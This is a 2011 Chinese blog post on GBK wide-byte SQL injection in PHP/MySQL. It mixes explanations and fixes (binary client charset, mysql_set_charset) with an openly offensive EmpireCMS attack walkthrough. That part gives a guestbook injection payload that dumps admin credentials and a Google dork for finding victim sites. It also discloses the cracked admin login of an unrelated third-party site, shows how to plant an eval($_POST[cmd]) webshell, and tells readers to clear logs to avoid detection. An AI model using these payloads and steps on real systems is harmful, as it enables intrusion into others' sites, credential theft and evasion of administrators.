---
id: 28
title: 宽字节（宽字符）注入
date: 2011-12-01T00:09:19+00:00
author: dawei
layout: post
guid: http://bookwikiup.com/blog/?p=28
permalink: /2011/12/01/%e5%ae%bd%e5%ad%97%e8%8a%82%ef%bc%88%e5%ae%bd%e5%ad%97%e7%ac%a6%ef%bc%89%e6%b3%a8%e5%85%a5/
categories:
  - 未分类
---
宽字节注入也是在最近的项目中发现的问题，大家都知道%df’ 被PHP转义（开启GPC、用addslashes函数，或者icov等），单引号被加上反斜杠，变成了 %df’，其中的十六进制是 %5C ，那么现在 %df’ = %df%5c%27，如果程序的默认字符集是GBK等宽字节字符集，则MYSQL用GBK的编码时，会认为 %df%5c 是一个宽字符，也就是縗’，也就是说：%df’ = %df%5c%27=縗’，有了单引号就好注入了。比如：

<span><span>$conn</span><span>&nbsp;=&nbsp;mysql_connect(”localhost”,”root”,”2sdfxedd”);&nbsp;</span></span><span>mysql_query(”SET&nbsp;NAMES&nbsp;‘GBK’”);&nbsp;</span><span>mysql_select_db(”test”,<span>$conn</span><span>);&nbsp;</span></span><span><span>$user</span><span>&nbsp;=&nbsp;mysql_escape_string(</span><span>$_GET</span><span>[</span><span>'user'</span><span>]);&nbsp;</span></span><span><span>$pass</span><span>&nbsp;=&nbsp;mysql_escape_string(</span><span>$_GET</span><span>[</span><span>'pass'</span><span>]);&nbsp;</span></span><span><span>$sql</span><span>&nbsp;=&nbsp;“select&nbsp;*&nbsp;from&nbsp;cms_user&nbsp;where&nbsp;username&nbsp;=&nbsp;‘</span><span>$user</span><span>’&nbsp;</span><span>and</span><span>&nbsp;password=’</span><span>$pass</span><span>’”;&nbsp;</span></span><span><span>$result</span><span>&nbsp;=&nbsp;mysql_query(</span><span>$sql</span><span>,</span><span>$conn</span><span>);&nbsp;</span></span><span><span>while</span><span>&nbsp;(</span><span>$row</span><span>&nbsp;=&nbsp;mysql_fetch_array(</span><span>$result</span><span>,&nbsp;MYSQL_ASSOC))&nbsp;{&nbsp;</span></span><span><span>$rows</span><span>[]&nbsp;=&nbsp;</span><span>$row</span><span>;&nbsp;</span></span><span>}&nbsp;</span><span>?>&nbsp;</span> 

则通过以下注入即可：

http://www.xxx.com/login.php?user=%df’%20or%201=1%20limit%201,1%23&pass=

对应的SQL是：

select * from cms_user where username = ‘運’ or 1=1 limit 1,1#’ and password=”

解决方法：就是在初始化连接和字符集之后，使用SET character\_set\_client=binary来设定客户端的字符集是二进制的。如：

<span><span>mysql_query(”SET&nbsp;character_set_client=binary”);&nbsp;</span></span> 

==================================================================

&nbsp;

<span><strong>php关于宽字节编码的一个实验</strong></span>  
<a target="_blank" href="http://hi.baidu.com/kashifs/blog/item/385b004410c5a1186a63e51a.html"><span><strong><span>http://hi.baidu.com/kashifs/blog/item/385b004410c5a1186a63e51a.html</span></strong></span></a>  
2010/12/01 06:06 P.M. 

<span>以前对宽字节还是停留在GET上，得益于toby57牛的某篇文章，深入了一下</span>

<span>GPC打开了</span>

<span>提交：‍誠&#8217;);phpinfo();//</span>

<span>转换：‍誠&#8217;);phpinfo();//</span>

&nbsp;

<span><?php</span>

<span>$config=array(&#8216;誠&#8217;);phpinfo();//&#8217;);</span>

<span>?></span>

<span>php开始处理：<span>D5 5C 5C 27&#8230;</span> ，先处理转义， 没有了特殊作用，变成了 <span>D5 &#8216; &#8230;</span>，开始执行：‍<span>誠&#8217;&#8230;</span>，单引号引入，phpinfo执行。</span>

<img id="" src="http://m3.img.libdd.com/farm5/125/55A98347E1BA718781EFD5703FFC6F7D_200_200.GIF" />

<span>运气好的话写shell？POST提交注入？</span>

<span>SET character_set_connection=$dbcharset, character_set_results=$dbcharset, <span>character_set_client=binary</span></span>

<span>前两句防止乱码，最后一句防止宽字节注入。</span>

<span></span><span>Toby57:</span>

<span>在character_set_client为GBK情况下还好点，在character_set_client为binary情况下，只有借助其它函数的转换如iconv等来引入特殊字符。</span>

<span>iconv(&#8216;GBK&#8217;, &#8216;UTF-8&#8242;, $_GET['para']); //由GBK编码转为UTF-8</span>

<span>test.php?para=a%e5%27</span>

<span>可在末尾引入chr(39) 即 &#8216;</span>

<span>$username=iconv(&#8216;UTF-8&#8242;, &#8216;GBK&#8217;, $_GET['para']); //由UTF-8编码转为GBK</span>

<span>test.php?para=a%e9%8c%a6</span>

<span>可在末尾引入chr(92) 即 </span>

==================================================================

&nbsp;

<span><strong>对宽字符的一些测试</strong></span>

一直觉得对这类漏洞成因了解不够透彻，今天用了一些简单测试。

<span><span><?php&nbsp;</span></span><span><span><span>//Magic_quote_GPC&nbsp;=&nbsp;ON</span></span><span>&nbsp;</span></span><span><span>$conn</span><span>&nbsp;=&nbsp;mysql_connect(</span><span>&#8217;127.0.0.1&#8242;</span><span>,</span><span>&#8216;root&#8217;</span><span>,</span><span>&#8216;root&#8217;</span><span>);&nbsp;</span></span><span>mysql_select_db(<span>&#8216;mysql&#8217;</span><span>,</span><span>$conn</span><span>);&nbsp;</span></span><span>mysql_query(<span>"SET&nbsp;character_set_client=&#8217;binary&#8217;"</span><span>)&nbsp;</span><span>or</span><span>&nbsp;</span><span>die</span><span>(mysql_error());&nbsp;</span></span><span><span><span>//mysql_query("SET&nbsp;character_set_client=&#8217;GBK&#8217;")&nbsp;or&nbsp;die(mysql_error());</span></span><span>&nbsp;</span></span><span><span><span>//$username=mb_convert_encoding($_GET['para'],&#8217;utf-8&#8242;,&#8217;gbk&#8217;);</span></span><span>&nbsp;</span></span><span><span><span>//$username=iconv(&#8216;GBK&#8217;,&nbsp;&#8216;UTF-8&#8242;,&nbsp;$_GET['para']);</span></span><span>&nbsp;</span></span><span><span>$username</span><span>=iconv(</span><span>&#8216;UTF-8&#8242;</span><span>,&nbsp;</span><span>&#8216;GBK&#8217;</span><span>,&nbsp;</span><span>$_GET</span><span>[</span><span>'para'</span><span>]);&nbsp;</span></span><span><span><span>//$username&nbsp;=&nbsp;stripslashes($_GET['para']);</span></span><span>&nbsp;</span></span><span><span>$querystr</span><span>&nbsp;=&nbsp;</span><span>"SELECT&nbsp;host&nbsp;FROM&nbsp;user&nbsp;WHERE&nbsp;user=&#8217;{$username}&#8217;"</span><span>;&nbsp;</span></span><span><span>echo</span><span>&nbsp;</span><span>$querystr</span><span>.</span><span>"<br/>"</span><span>;&nbsp;</span></span><span><span>if</span><span>&nbsp;(</span><span>$res</span><span>&nbsp;=&nbsp;mysql_query(</span><span>$querystr</span><span>)){&nbsp;</span></span><span><span>echo</span><span>&nbsp;</span><span>"OK..<br/>"</span><span>;&nbsp;</span></span><span>}&nbsp;</span><span><span>else</span><span>&nbsp;</span></span><span>{&nbsp;</span><span><span>echo</span><span>&nbsp;</span><span>"Bad..:::"</span><span>.mysql_error().</span><span>"<br/>"</span><span>;&nbsp;</span></span><span>}&nbsp;</span><span><span>echo</span><span>&nbsp;dumpstr(</span><span>$username</span><span>);&nbsp;</span></span><span><span>function</span><span>&nbsp;dumpstr(</span><span>$string</span><span>){&nbsp;</span></span><span><span>$tmpstr</span><span>&nbsp;=&nbsp;</span><span>&#8221;</span><span>;&nbsp;</span></span><span><span>for</span><span>(</span><span>$i</span><span>=0;isset(</span><span>$string</span><span>[</span><span>$i</span><span>]);</span><span>$i</span><span>++){&nbsp;</span></span><span><span>$tmpstr</span><span>&nbsp;.=&nbsp;</span><span>"chr("</span><span>.ord(</span><span>$string</span><span>[</span><span>$i</span><span>]).</span><span>")."</span><span>;&nbsp;</span></span><span>}&nbsp;</span><span><span>return</span><span>&nbsp;</span><span>substr</span><span>(</span><span>$tmpstr</span><span>,0,-1);&nbsp;</span></span><span>}&nbsp;</span><span>&nbsp;</span><span>?>&nbsp;</span> 

在character\_set\_client为GBK情况下还好点，在character\_set\_client为binary情况下，只有借助其它函数的转换如iconv等来引入特殊字符。  
iconv(&#8216;GBK&#8217;, &#8216;UTF-8&#8242;, $_GET['para']);//由GBK编码转为UTF-8  
test.php?para=a%e5%27  
可在末尾引入chr(39)即&#8217;。  
$username=iconv(&#8216;UTF-8&#8242;, &#8216;GBK&#8217;, $_GET['para']);//由UTF-8编码转为GBK  
test.php?para=a%e9%8c%a6  
可在末尾引入chr(92)即。

==================================================================

&nbsp;

<span><strong>还是宽字符。。</strong></span>

今天 发现了以前对mysql\_real\_escape\_string的误解,以前以为SET NAMES gbk加上real\_escape就安全了，结果不是这样，real_escape会根据当前连接的字符集进行编码，但仅仅SET NAMES并不会改变字符集，测试 如下：

<img id="" src="http://m3.img.libdd.com/farm5/171/628BFB0BDF900EF5965138C8798D21AB_200_200.GIF" />

返回

<img id="" src="http://m1.img.libdd.com/farm5/133/8BD296CF084C04F84E3E5DB0C45B4A85_200_200.GIF" />

要想通知PHP改变当前连接字符集还得使用mysql\_set\_charset()才行，做个简单记录。  
参考 ：  
<span>http://www.laruence.com/2010/04/12/1396.html</span>  
<span>http://www.mirecle.com/2010/04/13/php-in-the-set-names-and-mysql_set_charset.html</span>  
<span>http://topic.csdn.net/u/20090202/10/bc90e3a2-660b-443d-b1d0-6a644601bdd6.html</span>

==================================================================

&nbsp;

今天看了bhst的这篇文章

<span>http://www.bhst.org/viewthread.php?tid=1382&extra=page%3D1</span>

了解了宽字符注入的一些东西

php 使用 php\_escape\_shell_cmd这个函数来转义命令行字符串时是作为单字节处理的 而当操作系统设置了GBK、EUC-KR、SJIS等宽字节字符集时候，将这些命令行字符串传递给MySQL处理时是作为多字节处理的 

例如这里：

<span>http://localhost/gbk.php?username=%df%27</span> //多字节编码  
%df%27=運&#8217;&nbsp;&nbsp;&nbsp;&nbsp; //看，出单引号了，后面就可以构造了

<span>http://localhost/test/b.php?username=%df%27</span> or 1%23

sql语句类似这样: SELECT * FROM demo WHERE username = &#8216;運&#8217; or 1#&#8217; LIMIT 1

这样就可以注入啦

在php的处理过程中，它是单字节处理的，它只把输入当作一个字节流，而在linux设置了GBK字符集的时候，它的处理是双字节 的，大家的理解很明显地不一致。我们查下GBK的字符集范围为8140-FEFE，首字节在 81-FE 之间，尾字节在 40-FE 之间，而一个非常重要的字符的编码为5c，

结果就是：

神马php自带的addslashes，mysql\_escape\_string，

还有php.ini的magic\_quotes\_gpc神马的，都无法过滤宽字节搞出来的单引号，注入就来了

现在修补办法就是设置设置客户端的字符集为二进制，

类似这样：

mysql\_query("SET CHARACTER SET &#8216;gbk&#8217;", $conn); //不安全的 mysql\_query("SET character\_set\_connection=gbk, character\_set\_results=gbk, character\_set\_client=binary", $conn); //安全的 

当然，这样还不能高枕无忧，还需注意，在下面的使用中，不要将用户输入的东西随便转换编码，

因为一旦转换，宽字符就又来了<img id="" src="http://m3.img.libdd.com/farm2/250/E24F5BA63F2EA14C7D57B7293531EFFA_50_50.GIF" />，上面写的二进制可只有gbk，你要是转成utf-8，那宽字符不是又来了么。

&nbsp;

特别记录下，自己以后写代码神马的要注意下，假如要挖洞，也要注意，那个ECSHOP 2.6.x/2.7.x GBK版本的漏洞不就是这样的吗。

==================================================================

&nbsp;

帝国CMS系统注入漏洞分析 

在 介绍这个漏洞之前，有必要先明白一个概念——宽字节注入。宽字节注入是相对于单字节注入而言的。单字节注入就是大家平时的直接在带有参数ID的URL后面 追回SQL语句进行注入。比如：http://www.hackest.cn/article.php?id=1 and 1=1/*  
http://www.hackest.cn/article.php?id=1 and 1=2/*  
这个经典的判断目标是否存在注入的例子就是单字节注入。  
说 到这里好像还没有看出来到底有什么用。了解PHP+MySQL注入的朋友应该都明白，单引号在注入里绝对是个好东西。尤其是，很多程序员都过分依赖于 magic\_quotes\_gpc或者addslashes、iconv等函数的转义。理论上说，只要数据库连接代码设置了GBK编码，或者是默认编码就 是GBK，那现在的程序里到处都是注入漏洞。事实上，这种变换在XSS等领域也发挥了巨大的作用，在PHP+Linux后台程序结合的时候，还可能造成命 令注入，也就是说能可以在注入点直接执行Linux系统命令。比如登录文件login.php的代码如下：

&nbsp;

<span><span><?php&nbsp;</span></span><span><span>$conn</span><span>=mysql_connect(</span><span>"localhost"</span><span>,</span><span>"root"</span><span>,</span><span>"hackest"</span><span>);&nbsp;</span></span><span>mysql_query(<span>"SET&nbsp;NAMES&nbsp;&#8216;GBK&#8217;"</span><span>);&nbsp;</span></span><span>mysql_select_db(<span>"test"</span><span>,</span><span>$conn</span><span>);&nbsp;</span></span><span><span>$user</span><span>=mysql_escape_string(</span><span>$_GET</span><span>[</span><span>'user'</span><span>]);&nbsp;</span></span><span><span>$pass</span><span>=mysql_escape_string(</span><span>$_GET</span><span>[</span><span>'pass'</span><span>]);&nbsp;</span></span><span><span>$sql</span><span>=</span><span>"select&nbsp;*&nbsp;from&nbsp;cms_user&nbsp;where&nbsp;username=&#8217;$user&#8217;&nbsp;and&nbsp;password=&#8217;$pass&#8217;"</span><span>;&nbsp;</span></span><span><span>$result</span><span>=mysql_query(</span><span>$sql</span><span>,</span><span>$conn</span><span>);&nbsp;</span></span><span><span>while</span><span>&nbsp;(</span><span>$row</span><span>=mysql_fetch_array(</span><span>$result</span><span>,&nbsp;MYSQL_ASSOC))&nbsp;{&nbsp;</span></span><span><span>$rows</span><span>[]=</span><span>$row</span><span>;&nbsp;</span></span><span>}&nbsp;</span><span>?>&nbsp;</span> 

则可以通过构造以下语句进行注入：  
http://www.hackest.cn/login.php?user=%df&#8217;%20or%201=1%20limit%201,1%23&pass=  
%20是空格的URL编码，%23是#的URL编码，Mysql注释符之一。对应的SQL语句是：  
select * from cms_user where username=&#8217;運&#8217;or 1=1 limit 1,1#&#8217; and password="

&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;  
以上内容摘自网络，经过分析整理后用以说明问题，来源不详，感谢前辈们。^-^  
&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;

二、实践

理论准备得差不多了，该来点实际的了，这次就拿帝国CMS做例子吧。帝国CMS是号称最安全、最稳定的开源CMS（内容管理系统）。帝国CMS的留言本文件部分代码如下：

&nbsp;

<span><span><span>//权限</span></span><span>&nbsp;</span></span><span><span>if</span><span>(</span><span>$gbr</span><span>[</span><span>'groupid'</span><span>])&nbsp;</span></span><span>{&nbsp;</span><span><span>include</span><span>(</span><span>"../../class/user.php"</span><span>);&nbsp;</span></span><span><span>$user</span><span>=islogin();&nbsp;</span></span><span><span>include</span><span>(</span><span>"../../class/MemberLevel.php"</span><span>);&nbsp;</span></span><span><span>if</span><span>(</span><span>$level_r</span><span>[</span><span>$gbr</span><span>[groupid]][level]></span><span>$level_r</span><span>[</span><span>$user</span><span>[groupid]][level])&nbsp;</span></span><span>{&nbsp;</span><span><span>echo</span><span>"<script>alert(&#8216;您的会员级别不足("</span><span>.</span><span>$level_r</span><span>[</span><span>$gbr</span><span>[groupid]][groupname].</span><span>")，没有权限提交信息!&#8217;);history.go(-1);</script>"</span><span>;&nbsp;</span></span><span><span>exit</span><span>();&nbsp;</span></span><span>}&nbsp;</span><span>}&nbsp;</span><span>esetcookie(<span>"gbookbid"</span><span>,</span><span>$bid</span><span>,0);&nbsp;</span></span><span><span>$bname</span><span>=</span><span>$gbr</span><span>[</span><span>'bname'</span><span>];&nbsp;</span></span><span><span>$search</span><span>=</span><span>"&bid=$bid"</span><span>;&nbsp;</span></span><span><span>$page</span><span>=(int)</span><span>$_GET</span><span>[</span><span>'page'</span><span>];&nbsp;</span></span><span><span>$start</span><span>=(int)</span><span>$_GET</span><span>[</span><span>'start'</span><span>];&nbsp;</span></span><span><span>$line</span><span>=12;</span><span><span>//每页显示条数</span></span><span>&nbsp;</span></span><span><span>$page_line</span><span>=12;</span><span><span>//每页显示链接数</span></span><span>&nbsp;</span></span><span><span>$offset</span><span>=</span><span>$start</span><span>+</span><span>$page</span><span>*</span><span>$line</span><span>;</span><span><span>//总偏移量</span></span><span>&nbsp;</span></span><span><span>$totalnum</span><span>=(int)</span><span>$_GET</span><span>[</span><span>'totalnum'</span><span>];&nbsp;</span></span><span><span>if</span><span>(</span><span>$totalnum</span><span>)&nbsp;</span></span><span>{&nbsp;</span><span><span>$num</span><span>=</span><span>$totalnum</span><span>;&nbsp;</span></span><span>}&nbsp;</span><span><span>else</span><span>&nbsp;</span></span><span>{&nbsp;</span><span><span>$totalquery</span><span>=</span><span>"select&nbsp;count(*)&nbsp;as&nbsp;total&nbsp;from&nbsp;{$dbtbpre}enewsgbook&nbsp;where&nbsp;bid=&#8217;$bid&#8217;&nbsp;and&nbsp;checked=0"</span><span>;&nbsp;</span></span><span><span>$num</span><span>=</span><span>$empire</span><span>->gettotal(</span><span>$totalquery</span><span>);</span><span><span>//取得总条数</span></span><span>&nbsp;</span></span><span>}&nbsp;</span><span><span>$search</span><span>.=</span><span>"&totalnum=$num"</span><span>;&nbsp;</span></span><span><span>$query</span><span>=</span><span>"select&nbsp;lyid,name,email,`call`,lytime,lytext,retext&nbsp;from&nbsp;{$dbtbpre}enewsgbook&nbsp;where&nbsp;bid=&#8217;$bid&#8217;&nbsp;and&nbsp;checked=0"</span><span>;</span><span><span>//hackest注解：关键是这一句，与上面举例的何其相似啊！</span></span><span>&nbsp;</span></span><span><span>$query</span><span>=</span><span>$query</span><span>.</span><span>"&nbsp;order&nbsp;by&nbsp;lyid&nbsp;desc&nbsp;limit&nbsp;$offset,$line"</span><span>;&nbsp;</span></span><span><span>$sql</span><span>=</span><span>$empire</span><span>->query(</span><span>$query</span><span>);&nbsp;</span></span><span><span>$listpage</span><span>=page1(</span><span>$num</span><span>,</span><span>$line</span><span>,</span><span>$page_line</span><span>,</span><span>$start</span><span>,</span><span>$page</span><span>,</span><span>$search</span><span>);&nbsp;</span></span><span><span>$url</span><span>=</span><span>"<a&nbsp;href=../../../>"</span><span>.</span><span>$fun_r</span><span>[</span><span>'index'</span><span>].</span><span>"</a>&nbsp;>&nbsp;"</span><span>.</span><span>$fun_r</span><span>[</span><span>'saygbook'</span><span>];&nbsp;</span></span><span>?>&nbsp;</span> 

注 意注释部分！ 作者：hackest [H.S.T.]  
注 意注释部分！就直接拿官方测试吧，我就不本机折腾了。官方演示站点：http://demo.phome.net/，还别说，界面倒是蛮清爽的，难怪这么 多站长用咯。直奔留言本页面：http://demo.phome.net/e/tool/gbook/?bid=1，注意要带上bid=1（我下载了套 最新版的帝国CMS，e/tool/gbook目录下就一个index.php文件，直接访问它会有错误提示，并跳转至前一个页面）。然后下拉至“请您留 言:”处，按如下要求填写相关信息：  
姓名：123縗  
联系邮箱：,1,1,1,(select concat(username,0x5f,password,0x5f,rnd) from phome_enewsuser where userid=1),1,1,1,0,0,0)/*  
联系电话：随便写  
留言内容：随便写

填好后如图2

<img id="" src="http://m3.img.libdd.com/farm4/40/99E412165529C0A281C319BA4C4E3128_200_200.GIF" />

提交后就能看到爆出来的用户名、密码MD5、还有rnd值了，如图3。

<img id="" src="http://m3.img.libdd.com/farm4/229/0B31C23864828622433C60045C7E10E5_200_200.GIF" />

wm_chief就是开发帝国CMS的程序员。因为提交了好几遍，在后台又删不掉，所以有多条记录。破解出来密码明文就可以登录后台了，不过官方演示站点后台并没有数据库操作权限，凡是涉及到数据库的操作就会提示：

在线演示仅开放观看权限，与数据库相关操作已被管理员禁止!  
如果您的浏览器没有自动跳转，请点击这里

而 且这个MD5是在线查询查不出来的，明文是用MD5的彩虹表破解出来的，后面会附图。这个后台就是只能让你看看，顺便体验一下其强大的功能（官方也提供的 演示管理员用户名和密码均为admin，也可以登录，不过都是操作不了的），拿这个密码去社工一下管理员，也没有什么意外的收获，其博客、论坛、邮箱、官 方站点FTP、官方站点3389等均无法进入，所以官方是搞不到Webshell了。  
三、替补

官方进不去就找个替罪羊吧，Google以关键字“inurl:e/tool/gbook/?bid=1”搜索，搜出来的站点99%都是用帝国CMS的。随便找了一个，测试证明，漏洞存在，如图4。

<img id="" src="http://m2.img.libdd.com/farm4/168/F7DF2447B5F32E57ADE7FF69D2E1D3A8_200_200.GIF" />

可恨的是这个MD5值也是无法在线查询出来的，又得开动彩虹表跑跑咯，把刚才官方的那个MD5也一起跑了吧，出去吃完饭回来，结果就出来了，如图5。

<img id="" src="http://m1.img.libdd.com/farm4/151/BDAD499A92E4452841E0D43155FBFB97_200_200.GIF" />

顺 便啰嗦一下，如果有志于网络安全事业的发展，彩虹表还是必不可少的。什么是彩虹表呢？就是一个庞大的、针对各种可能的字母组合预先计算好的哈希值的集合， 不一定是针对MD5算法的，各种算法的都有，有了它可以快速的破解各类密码。越是复杂的密码，需要的彩虹表就越大，现在主流的彩虹表都是100G以上。

该进后台了，后台地址默认为e/admin/。用户名：joycar，密码：zuxywz119，顺便进入后台，如图6。

<img id="" src="http://m1.img.libdd.com/farm5/218/4B042B1E00CDEB8426ED20A3009ABCDA_200_200.GIF" />

进 了后台应该怎么样才能拿到Webshell呢？添加上传后缀，我试了下，不可行。网上搜了一下相关资料，原来在模板管理那里有猫腻哦。进入后台-> 模板管理->自定义页面->增加自定义页面。页面名称随便填，文件名也得取一个，文件名处可以填指定路径，分类不必理会，页面内容处写入如下 代码：

<?php eval($_POST[cmd]);?>

一般的PHP一句话马的代码 是<?php eval($_POST[cmd]);?>，其中cmd是密码。但是这里一定要按上面要求的前后都要加上，不加的话就不会成功，非常重要，务必记 住！然后点击提交，再返回到管理自定义页面，点击刚才起的页面名称，直接跳转至e/admin/template/hackest.php，无法找到该 页，路径不对嘛，当然找不到了，改成e/admin/hackest.php，再访问，一片空白，心中窃喜，有戏了……如图7、图8。

<img id="" src="http://m2.img.libdd.com/farm5/244/D8F05F1C03C14E0AD6E9CA6751E3C2F4_200_200.GIF" />

<img id="" src="http://m3.img.libdd.com/farm4/36/884A6F5B1D971A7B8A4A144838C7B424_200_200.GIF" />

再用lanker微型PHP+ASP管理器1.0双用版连接一句话，提交下环境变量看看，如图9。

<img id="" src="http://m3.img.libdd.com/farm5/30/B481D541B54DEA6915330B1D3366F61E_200_200.GIF" />

再上传一个PHP大马就大功告成了，是Linux系统的，发行版是Red Hat Enterprise Linux AS release 4，有溢出保护，提不了权咯，如图10。

<img id="" src="http://m2.img.libdd.com/farm5/237/D885D5DAA1606587AA284DF2697B24ED_200_200.GIF" />

最 后千万记得把刚才爆用户名和密码的那条留言删除，再把你添加的自定义页面也删除，后台日志也处理下。好多人都不知道什么叫清理日志，其实就是尽可能地把关 于你的操作的相关记录删除。比如你登录了3389，系统日志会记录，比如你登录了FTP，应用程序日志也会记录，比如你对这个网站做了注入攻击，IIS或 者其他WEB应用程序也会记录……技术过硬的管理员能从这些日志里分析出你的攻击方法，攻击来源等细节，安全工作一定要做足，万万马虎不得。

四、修补

官方虽然也被爆了一段时间了，但是似乎并没有引起足够的重视，截止至发稿日仍然没看到官方有任何关于修补此漏洞的解决方案（其实也不能完全算是帝国CMS的错，编码这个问题最近闹得比较凶-_-）。

解 决方法：就是在初始化连接和字符集之后，使用SET character\_set\_client=binary来设定客户端的字符集是二进制的。修改Windows下的MySQL配置文件一般是 my.ini，Linux下的MySQL配置文件一般是my.cnf，比如：mysql\_query("SET character\_set\_client=binary");。character\_set_client指定的是SQL语句的编码，如果设置为 binary，MySQL就以二进制来执行，这样宽字节编码问题就没有用武之地了。  
&nbsp;

大 家都知道PHP在开启magic\_quotes\_gpc或者使用addslashes、iconv等函数的时候，单引号（&#8217;）会被转义成&#8217;。比如字 符%bf在满足上述条件的情况下会变成%bf&#8217;。其中反斜杠（）的十六进制编码是%5C，单引号（&#8217;）的十六进制编码是%27，那么就可以得出%bf &#8216;=%bf%5c%27。如果程序的默认字符集是GBK等宽字节字符集，则MySQL会认为%bf%5c是一个宽字符，也就是“縗”。也就是说%bf &#8216;=%bf%5c%27=縗&#8217;。%bf并不是唯一的一个字符，应该是%81-%FE之间的任意一个都可以。不太好理解，我们用小葵写的一个字符转换的小 工具来转换一下，如图1。  
&nbsp;  
打开Google以关键字inurl:e/tool/gbook/?bid=1进行搜索。   
搜索出来的是留言本，其实就是留言本出现漏洞了。   
主要填写您的姓名和联系邮箱这两处，其它的随便填。   
您的姓名:縗   
联系邮箱:,1,1,1,(select concat(username,0x5f,password,0x5f,rnd) from phome_enewsuser where userid=1),1,1,1,0,0,0)/*   
然后进行提交返回页面即爆出用户名密码。人品好的话，密码破解成功后进入网站后台，后台地址 e/admin/   
接着拿shell，进入后台后点顶部模板管理。然后左边的自定义页面-增加自定义页面，页面内容填写PHP一句话，<?php eval($_POST[cmd]);?>完了，回到管理自定义页面，点击刚才起的页面名称。页面直接跳转到e/admin/template /x.php，提示会找不到页面，去掉template即可。真实地址是e/admin/x.php，如显示一片空白的话就成功了。   
最后用lanker微型PHP+ASP双用版连接一句话即可。   
提示:别死心眼啊，自定义页面内容可以改成ASP的。

&nbsp;